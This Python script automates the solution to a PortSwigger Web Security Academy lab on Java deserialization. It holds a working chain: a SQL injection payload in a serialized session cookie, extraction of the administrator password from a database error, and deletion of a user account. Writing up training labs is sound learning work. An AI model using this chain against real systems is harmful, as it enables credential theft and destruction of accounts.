#!/usr/bin/env python3
"""
Developing a custom gadget chain for Java deserialization
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 08-developing-a-custom-gadget-chain-for-java-deserialization.md

What this does -- and what it honestly cannot do standalone:
    This lab's vulnerable class, ProductTemplate, lives in the target's own
    leaked source (/backup/ProductTemplate.java), not in a public library --
    so there is no ysoserial chain for it. Its readObject() runs
    `SELECT * FROM products WHERE id = '{id}' LIMIT 1` with the id field
    interpolated straight from the deserialized object, which means the
    only way to produce a wire-compatible malicious instance is to compile
    a matching local ProductTemplate class and let Java's own
    ObjectOutputStream serialize it -- there's no pure-Python way to
    produce bytes a real JVM's ObjectInputStream will accept as that class.

    Our own solve shelled out to a pre-compiled local harness exactly like
    this:

        java -cp ~/tools/java-exploit Main '<sql-injection-string>'

    printing a base64-encoded serialized ProductTemplate to stdout. The
    exact source of that Main.java harness isn't in our records (it lived
    outside this repo), so it is NOT reconstructed here -- inventing one
    would risk a serialVersionUID or field layout mismatch the target's
    JVM would silently reject. What IS documented and required to write
    your own harness:
      - package: data.productcatalog
      - serialVersionUID: 1L
      - one field: private final String id
      - Main should accept the SQL injection string as argv[1] and print
        base64(serialize(new ProductTemplate(argv[1]))) to stdout.

    Everything downstream of that harness call -- sending the payload,
    extracting the password from the PostgreSQL cast error, logging in as
    admin, and deleting carlos -- IS fully automated below.

Usage:
    python 08-developing-a-custom-gadget-chain-for-java-deserialization.py <lab-url>
    e.g. python 08-developing-a-custom-gadget-chain-for-java-deserialization.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    A JDK (java on PATH, or under C:\\Program Files\\Java / C:\\Program Files\\Eclipse Adoptium)
    Your own compiled Main.java harness at ~/tools/java-exploit/ (see interface above)
"""

import os
import re
import subprocess
import sys
import urllib.parse

import httpx


def _login(client: httpx.Client, base_url: str, username: str, password: str) -> str:
    login_page = client.get(f"{base_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else None
    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf"] = csrf
    client.post(f"{base_url}/login", data=login_data)
    return client.cookies.get("session")


def _find_java_binaries() -> list[str]:
    java_paths = ["java"]
    for jdir in [r"C:\Program Files\Java", r"C:\Program Files\Eclipse Adoptium"]:
        if os.path.isdir(jdir):
            for d in sorted(os.listdir(jdir), reverse=True):
                jp = os.path.join(jdir, d, "bin", "java.exe")
                if os.path.exists(jp):
                    java_paths.insert(0, jp)
                    break
    return java_paths


def _generate_product_template_payload(sql_injection: str) -> str | None:
    exploit_dir = os.path.expanduser("~/tools/java-exploit")
    main_java = os.path.join(exploit_dir, "Main.java")
    if not os.path.exists(main_java):
        print(f"[!] {main_java} not found -- see this script's docstring for the required")
        print("    Main.java interface. Compile it before running this step.")
        return None

    for java_bin in _find_java_binaries():
        try:
            result = subprocess.run(
                [java_bin, "-cp", exploit_dir, "Main", sql_injection],
                capture_output=True, text=True, timeout=15,
            )
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url, "wiener", "peter")
    if not session:
        print("[-] Login failed")
        return

    print("[*] Checking /backup for the ProductTemplate.java source leak...")
    r = client.get(f"{lab_url}/backup")
    if "ProductTemplate" in r.text:
        print("[+] Found ProductTemplate.java in /backup")
    else:
        print("[-] No source code at /backup -- proceeding anyway")

    sqli = "' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--"
    print("[*] Generating a serialized ProductTemplate with the SQLi payload as id...")
    payload_b64 = _generate_product_template_payload(sqli)
    if not payload_b64:
        print("[!] Failed to generate the Java payload -- see the docstring for the Main.java harness.")
        return

    payload_url = urllib.parse.quote(payload_b64, safe="")
    r = httpx.get(
        f"{lab_url}/my-account",
        headers={"Cookie": f"session={payload_url}"},
        follow_redirects=True,
        timeout=15,
    )
    print(f"[*] Injection response: HTTP {r.status_code}")

    # &quot; -> " before matching, since the error text is HTML-escaped.
    text = r.text.replace("&quot;", '"')
    match = re.search(r'invalid input syntax for (?:type )?integer: "([^"]+)"', text)
    if not match:
        print("[-] Could not extract the password from the response -- check the error text.")
        return

    admin_pw = match.group(1)
    print(f"[+] Extracted administrator password: {admin_pw}")

    admin_client = httpx.Client(follow_redirects=True, timeout=15)
    admin_client.post(f"{lab_url}/login", data={"username": "administrator", "password": admin_pw})
    r = admin_client.get(f"{lab_url}/admin")
    delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', r.text)
    if delete_match:
        admin_client.get(f"{lab_url}{delete_match.group(1)}")
        print("[+] Deleted carlos")
    else:
        print("[-] No delete link for carlos found on /admin")

    check = admin_client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
